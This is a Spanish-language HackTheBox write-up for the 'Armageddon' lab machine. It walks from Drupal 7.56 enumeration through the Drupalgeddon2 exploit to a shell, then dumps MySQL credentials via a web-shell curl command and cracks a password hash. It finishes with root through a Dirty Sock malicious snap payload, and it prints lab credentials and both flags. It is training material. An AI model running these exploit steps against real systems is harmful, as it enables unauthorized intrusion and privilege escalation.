# Armageddon - HackTheBox - Writeup PistachaHacker

![Dificultad](https://img.shields.io/badge/Dificultad-Fácil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Tags](https://img.shields.io/badge/Tags-CMS%20|%20Drupal%20|%20SQLi%20|%20PrivEsc-orange)


<div align="center">
  <img width="882" height="633" alt="Pwned!" src="https://github.com/user-attachments/assets/1511774c-a93f-42d4-be61-7c59d0a03a14" />
</div>



## Información de la Máquina

- **Nombre**: Armageddon
- **Autor del Writeup**: PistachaHacker
- **Fecha**: 19 de septiembre de 2025
- **Dificultad**: Fácil
- **Sistema Operativo**: Linux (CentOS)
- **IP**: 10.10.10.233

### Tags
`CMS` `Drupal` `SUDO -L` `Drupalgeddon` `Drupalgeddon2` `Dirty Sock` `Snap` `MySQL`

---

## Índice

1. [Enumeración Inicial](#1-enumeración-inicial)
2. [Enumeración Web](#2-enumeración-web)
3. [Explotación](#3-explotación)
4. [Escalada de Privilegios](#4-escalada-de-privilegios)
5. [Flags](#5-flags)

---

## 1. Enumeración Inicial

### Escaneo de Puertos

Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:

```bash
sudo nmap --min-rate 1500 10.10.10.233 -sCV -Pn -sS -oN ports.txt
```

### Servicios Detectados

| Puerto | Servicio | Versión | Notas |
|--------|----------|---------|-------|
| 22 | SSH | OpenSSH 7.4 | Banner grabbing |
| 80 | HTTP | Apache 2.4.6 (CentOS) PHP/5.4.16 | Servidor web |

### Stack Tecnológico

- **Servidor Web**: Apache httpd 2.4.6
- **Sistema Operativo**: CentOS
- **Backend**: PHP/5.4.16
- **CMS**: Drupal 7
- **Título del sitio**: "Welcome to Armageddon | Armageddon"

### Análisis de robots.txt

El archivo robots.txt reveló 36 entradas prohibidas, incluyendo:

**Rutas sensibles expuestas:**
- Directorios del CMS: `/includes/`, `/modules/`, `/themes/`, `/profiles/`
- Archivos de instalación: `INSTALL.mysql.txt`, `INSTALL.pgsql.txt`, `install.php`
- Documentación: `CHANGELOG.txt`, `LICENSE.txt`, `MAINTAINERS.txt`
- Scripts: `/scripts/`, `cron.php`

### Headers HTTP

```
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Generator: Drupal 7 (http://drupal.org)
```

---

## 2. Enumeración Web

### Reconocimiento de Directorios

```bash
dirsearch -u http://10.10.10.233
```

### Directorios Interesantes

- **CHANGELOG.txt** → Identificar versión exacta de Drupal
- **install.php** → Posible reconfiguración si está activo
- **xmlrpc.php** → Vector de bruteforce y RCE
- **modules/** → Enumerar módulos vulnerables

**Versión identificada**: Drupal 7.56 (encontrada en `/CHANGELOG.txt`)

### Herramienta de Enumeración Propia

Se utilizó [drupal-enum v3.0](https://github.com/pistacha-git/EnumX-Offensive-Enumeration-Tools/tree/main/drupal-enum) para complementar la enumeración.

### Vulnerabilidades Detectadas

La versión Drupal 7.56 es vulnerable a:

- **CVE-2018-7600** (Drupalgeddon2): Ejecución Remota de Código (RCE) ⚠️ CRÍTICO
- **CVE-2018-7602** (Drupalgeddon3): Ejecución Remota de Código (RCE)
- **CVE-2014-3704** (Drupalgeddon): Inyección SQL

---

## 3. Explotación

### Vector de Ataque: CVE-2018-7600 (Drupalgeddon2)

**Severidad**: Crítica  
**CVE**: CVE-2018-7600

### Pasos de Explotación

#### 1. Desarrollo del Exploit

Se utilizó el exploit público disponible en GitHub:

```bash
# Clonar repositorio
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2

# Verificar dependencias de Ruby
gem install highline
```

#### 2. Ejecución del Exploit

```bash
ruby drupalgeddon2.rb http://10.10.10.233
```

### Acceso Inicial Obtenido

- **Usuario**: apache
- **Shell**: Pseudo-shell interactiva
- **Directorio**: /var/www/html

```bash
uname -a
# Linux armageddon.htb 3.10.0-1160.el7.x86_64 #1 SMP x86_64 GNU/Linux

id
# uid=48(apache) gid=48(apache) groups=48(apache)
```

### Búsqueda de Credenciales

Se localizaron credenciales de MySQL en `/sites/default/settings.php`:

- **Usuario**: drupaluser
- **Contraseña**: CQHEy@9M*m23gBVj

### Extracción del Hash

```bash
curl -G --data-urlencode "c=mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'select * from users' drupal" http://10.10.10.233/shell.php
```

**Hash obtenido del usuario brucetherealadmin:**
```
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

### Cracking del Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=drupal7 hash
```

**Contraseña crackeada**: `booboo`

### Acceso SSH

```bash
ssh brucetherealadmin@10.10.10.233
# Password: booboo
```

### Flag de Usuario

```bash
cat /home/brucetherealadmin/user.txt
```

🚩 **User Flag**: `7cf83bf9f28d6174d8be50721514e444`

---

## 4. Escalada de Privilegios

### Exploit: Dirty Sock

#### 1. Identificación del Vector

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/snap install *
```

El usuario puede ejecutar `snap install` como root sin contraseña.

#### 2. Descripción del Exploit

Dirty Sock explota una vulnerabilidad en snapd que permite ejecutar código arbitrario durante la instalación de un paquete snap malicioso.

**El script malicioso crea un usuario con privilegios sudo:**
- Usuario: `dirty_sock`
- Contraseña: `dirty_sock`
- Permisos: Acceso completo sudo

#### 3. Proceso de Explotación

**Paso 1**: Crear el paquete malicioso
```bash
python -c 'print "aHNxc..." + "A"*4256 + "=="' | base64 -d > install.snap
```

**Paso 2**: Instalar el snap con privilegios root
```bash
sudo -u root /usr/bin/snap install --devmode install.snap
```

**Paso 3**: Cambiar al usuario creado
```bash
su dirty_sock
# Password: dirty_sock
```

**Paso 4**: Escalar a root
```bash
sudo su
# Password: dirty_sock
```

### Debilidades Explotadas

- Privilegios sudo mal configurados
- Hooks de instalación sin restricciones
- Modo devmode inseguro
- Falta de validación del contenido

### Flag de Root

```bash
cat /root/root.txt
```

🚩 **Root Flag**: `c8196de4144f92002927a237567c9acd`

---

## 5. Flags

### User Flag
- **Ubicación**: `/home/brucetherealadmin/user.txt`
- **Flag**: `7cf83bf9f28d6174d8be50721514e444`

### Root Flag
- **Ubicación**: `/root/root.txt`
- **Flag**: `c8196de4144f92002927a237567c9acd`

---

## Resumen del Ataque

1. **Reconocimiento**: Identificación de Drupal 7.56
2. **Explotación inicial**: CVE-2018-7600 (Drupalgeddon2) → Shell como apache
3. **Extracción de credenciales**: MySQL credentials → Hash de usuario
4. **Cracking**: John the Ripper → Contraseña SSH
5. **Acceso de usuario**: SSH como brucetherealadmin
6. **Escalada de privilegios**: Dirty Sock (snap install) → Root

---

## Herramientas Utilizadas

- nmap
- whatweb
- wappalyzer
- dirsearch
- [drupal-enum](https://github.com/pistacha-git/EnumX-Offensive-Enumeration-Tools/tree/main/drupal-enum)
- [Drupalgeddon2 exploit](https://github.com/dreadlocked/Drupalgeddon2)
- John the Ripper
- curl
- Python

---

## Lecciones Aprendidas

- Siempre enumerar versiones exactas de CMS mediante archivos de documentación
- Las versiones antiguas de Drupal son altamente vulnerables a RCE
- Los permisos sudo mal configurados pueden llevar a escalada de privilegios
- La instalación de paquetes snap con privilegios elevados es extremadamente peligrosa

---

**Disclaimer**: Este writeup es con fines educativos. Solo realiza pentesting en entornos autorizados.

---


<div align="center">
  <img width="500" height="500" alt="PistachaHacker" src="https://github.com/user-attachments/assets/d3242a6a-a0e3-4641-a46c-0fbb2f2873e2" />
</div>





<div align="center">
⭐ ¡Si te ha sido útil este writeup, considera darle una estrella al repositorio!
</div>


